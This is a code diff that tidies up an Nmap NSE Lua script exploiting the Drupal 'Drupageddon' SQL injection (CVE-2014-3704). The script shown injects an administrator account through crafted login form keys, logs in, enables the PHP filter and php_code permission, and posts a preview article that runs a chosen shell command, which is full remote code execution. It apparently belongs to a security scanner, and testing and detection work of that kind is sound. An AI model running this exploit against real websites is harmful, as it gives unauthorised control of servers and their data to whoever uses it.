@@ -1,22 +1,30 @@
+local bit = require "bit"
 local http = require "http"
+local math = require "math"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
+local string = require "string"
+local table = require "table"
 local url = require "url"
 local vulns = require "vulns"
 local re = require "re"
 local openssl = require "openssl"
 
 description = [[
-Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32 of Drupal core are known to be affected.
+Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
+of Drupal core are known to be affected.
 
-Vulnerability allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.
+Vulnerability allows remote attackers to conduct SQL injection attacks via an
+array containing crafted keys.
 
-The script injects new Drupal administrator user via login form and then it attempts to log in as this user to determine if target is vulnerable. If that's the case following exploitation steps are performed:
+The script injects new Drupal administrator user via login form and then it
+attempts to log in as this user to determine if target is vulnerable. If that's
+the case following exploitation steps are performed:
 
 * PHP filter module which allows embedded PHP code/snippets to be evaluated is enabled,
 * permission to use PHP code for administrator users is set,
 * new article which contains payload is created & previewed,
-* cleanup: by default all DB records that were added/modified by the script are restored. 
+* cleanup: by default all DB records that were added/modified by the script are restored.
 
 Vulnerability originally discovered by Stefan Horst from SektionEins.
 
@@ -31,16 +39,16 @@ Exploitation technique used to achieve RCE on the target is based on exploit/mul
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
--- | http-vuln-cve2014-3704: 
+-- | http-vuln-cve2014-3704:
 -- |   VULNERABLE:
 -- |   Drupal - pre Auth SQL Injection Vulnerability
 -- |     State: VULNERABLE (Exploitable)
 -- |     IDs:  CVE:CVE-2014-3704
--- |       The expandArguments function in the database abstraction API in 
+-- |       The expandArguments function in the database abstraction API in
 -- |       Drupal core 7.x before 7.32 does not properly construct prepared
 -- |       statements, which allows remote attackers to conduct SQL injection
 -- |       attacks via an array containing crafted keys.
--- |       
+-- |
 -- |     Disclosure date: 2014-10-15
 -- |     Exploit results:
 -- |       Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
@@ -48,11 +56,14 @@ Exploitation technique used to achieve RCE on the target is based on exploit/mul
 -- |       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
 -- |       https://www.drupal.org/SA-CORE-2014-005
 -- |       http://www.securityfocus.com/bid/70595
--- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3704 
+-- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3704
 --
 -- @args http-vuln-cve2014-3704.uri Drupal root directory on the website. Default: /
 -- @args http-vuln-cve2014-3704.cmd Shell command to execute. Default: nil
--- @args http-vuln-cve2014-3704.cleanup Indicates whether cleanup (removing DB records that was added/modified during exploitation phase) will be done. Default: true
+-- @args http-vuln-cve2014-3704.cleanup Indicates whether cleanup (removing DB
+--                                      records that was added/modified during
+--                                      exploitation phase) will be done.
+--                                      Default: true
 ---
 
 author = "Mariusz Ziulek <mzet()owasp org>"
@@ -74,7 +85,7 @@ local function multipart_append_data(r, k, data, extra)
     r[#r + 1] = string.format("\r\ncontent-transfer-encoding: %s", extra.content_transfer_encoding)
   end
   r[#r + 1] = string.format("\r\n\r\n")
-  r[#r + 1] = data 
+  r[#r + 1] = data
   r[#r + 1] = string.format("\r\n")
 end
 
@@ -88,35 +99,35 @@ local function multipart_build_body(content, boundary)
       multipart_append_data(r, k, v, {})
     elseif type(v) == "table" then
       if v.data == nil then return nil end
-        local extra = {
-          filename = v.filename or v.name,
-          content_type = v.content_type or v.mimetype or "application/octet-stream",
-          content_transfer_encoding = v.content_transfer_encoding or "binary",
-        }
-        multipart_append_data(r, k, v.data, extra)
+      local extra = {
+        filename = v.filename or v.name,
+        content_type = v.content_type or v.mimetype or "application/octet-stream",
+        content_transfer_encoding = v.content_transfer_encoding or "binary",
+      }
+      multipart_append_data(r, k, v.data, extra)
     else
       return nil
     end
   end
-    
+
   r[#r + 1] =  string.format("--%s--\r\n", boundary)
   return table.concat(r)
 end
 
 local function extract_CSRFtoken(content)
-  pattern = 'name="form_token" value="(.-)"'
-  value = string.match(content, pattern)
+  local pattern = 'name="form_token" value="(.-)"'
+  local value = string.match(content, pattern)
   return value
 end
 
 local function itoa64(index)
   local itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
-  return string.char(string.byte(itoa64, index + 1))
+  return string.sub(itoa64, index + 1, index + 1)
 end
 
 local function phpass_encode64(input)
   local count = #input + 1
-  local out = {} 
+  local out = {}
   local cur = 1
 
   while cur < count do
@@ -125,7 +136,7 @@ local function phpass_encode64(input)
     table.insert(out, itoa64(bit.band(value, 0x3f)))
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 8)) 
+      value = bit.bor(value, bit.lshift(string.byte(input, cur), 8))
     end
     table.insert(out, itoa64(bit.band(bit.rshift(value, 6), 0x3f)))
 
@@ -135,7 +146,7 @@ local function phpass_encode64(input)
     cur = cur + 1
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 16)) 
+      value = bit.bor(value, bit.lshift(string.byte(input, cur), 16))
     end
     table.insert(out, itoa64(bit.band(bit.rshift(value, 12), 0x3f)))
 
@@ -153,7 +164,7 @@ end
 local function gen_passwd_hash(passwd)
   local iter = 15
   local iter_char = itoa64(iter)
-  local iter_count = math.pow(2, iter) 
+  local iter_count = math.pow(2, iter)
   local salt = stdnse.generate_random_string(8)
 
   local md5 = openssl.md5(salt .. passwd)
@@ -200,10 +211,13 @@ local function do_sql_query(host, port, uri, user)
 
   local r = "name[0;" .. query .. "#%20%20]=" .. stdnse.generate_random_string(10) .. "&name[0]=" .. stdnse.generate_random_string(10) .. "&pass=" .. stdnse.generate_random_string(10) .. "&form_id=user_login&op=Log+in"
 
-  opt = {}
-  opt['header'] = {}
-  opt['header']['Content-Type'] = "application/x-www-form-urlencoded"
-  res = http.post(host, port, uri .. "/user/login", opt, nil, r)
+  local opt = {
+    header = {
+      ['Content-Type'] = "application/x-www-form-urlencoded"
+    }
+  }
+  local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
+  --TODO: Check return status
 
   return user, passwd
 end
@@ -229,8 +243,8 @@ local function set_php_filter(host, port, uri, session, disable)
   local data = {}
   for m in string.gmatch(res.body, enabledModulesPattern) do
     data[m] = 1
-    if disable and m == 'modules[Core][php][enable]' then 
-      data[m] = nil 
+    if disable and m == 'modules[Core][php][enable]' then
+      data[m] = nil
     end
   end
 
@@ -245,7 +259,7 @@ local function set_php_filter(host, port, uri, session, disable)
 
   return true
 end
-  
+
 local function set_permission(host, port, uri, session, disable)
 
   -- allow Administrator to use php_code
@@ -263,12 +277,12 @@ local function set_permission(host, port, uri, session, disable)
 
   local csrfToken = extract_CSRFtoken(res.body)
 
-  local enabledPermsRegex = 'name="([^"]*)" value="([^"]*)" checked="checked"' 
+  local enabledPermsRegex = 'name="([^"]*)" value="([^"]*)" checked="checked"'
   local data = {}
   for key, value in string.gmatch(res.body, enabledPermsRegex) do
     data[key] = value
-    if disable and key == '3[use text format php_code]' then 
-      data[key] = nil 
+    if disable and key == '3[use text format php_code]' then
+      data[key] = nil
     end
   end
 
@@ -304,14 +318,14 @@ local function trigger_exploit(host, port, uri, session, cmd)
   opt['header'] = {}
   opt['header']["Content-Type"] = "multipart/form-data" .. "; boundary=" .. boundary
 
-  files = {}
-  files['title'] = 'title'
-  files['title'] = 'title'
-  files['form_id'] = 'article_node_form'
-  files['form_token'] = csrfToken
-  files['body[und][0][value]'] = payload
-  files['body[und][0][format]'] = 'php_code'
-  files['op'] = 'Preview'
+  local files = {
+    ['title'] = 'title',
+    ['form_id'] = 'article_node_form',
+    ['form_token'] = csrfToken,
+    ['body[und][0][value]'] = payload,
+    ['body[und][0][format]'] = 'php_code',
+    ['op'] = 'Preview',
+  }
   local body = multipart_build_body(files, boundary)
 
   res = http.post(host, port, uri .. "/node/add/article", opt, nil, body)
@@ -321,7 +335,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
 end
 
 action = function(host, port)
-  
+
   local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
   local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
   local cleanup = nil
@@ -330,7 +344,7 @@ action = function(host, port)
   end
 
   local user, passwd = do_sql_query(host, port, uri, nil)
-    
+
   stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
   local data = {}
   data['name'] = user
@@ -338,27 +352,27 @@ action = function(host, port)
   data['form_id'] = 'user_login'
   data['op'] = 'Log in'
 
-  res = http.post(host, port, uri .. "/user/login", nil, nil, data)
+  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
 
   if res.status == 302 and res.cookies[1].name ~= nil then
     local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
     local vuln = {
-    title = 'Drupal - pre Auth SQL Injection Vulnerability',
-    state = vulns.STATE.NOT_VULN, 
-    description = [[
-The expandArguments function in the database abstraction API in 
+      title = 'Drupal - pre Auth SQL Injection Vulnerability',
+      state = vulns.STATE.NOT_VULN,
+      description = [[
+The expandArguments function in the database abstraction API in
 Drupal core 7.x before 7.32 does not properly construct prepared
 statements, which allows remote attackers to conduct SQL injection
 attacks via an array containing crafted keys.
       ]],
       IDS = {CVE = 'CVE-2014-3704'},
       references = {
-          'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
-          'https://www.drupal.org/SA-CORE-2014-005',
-          'http://www.securityfocus.com/bid/70595',
+        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
+        'https://www.drupal.org/SA-CORE-2014-005',
+        'http://www.securityfocus.com/bid/70595',
       },
       dates = {
-          disclosure = {year = '2014', month = '10', day = '15'},
+        disclosure = {year = '2014', month = '10', day = '15'},
       },
     }
     stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
@@ -380,7 +394,7 @@ attacks via an array containing crafted keys.
         cmdOut = m
         break
       end
-      
+
       if cmdOut ~= nil then
         vuln.exploit_results = cmdOut
       end
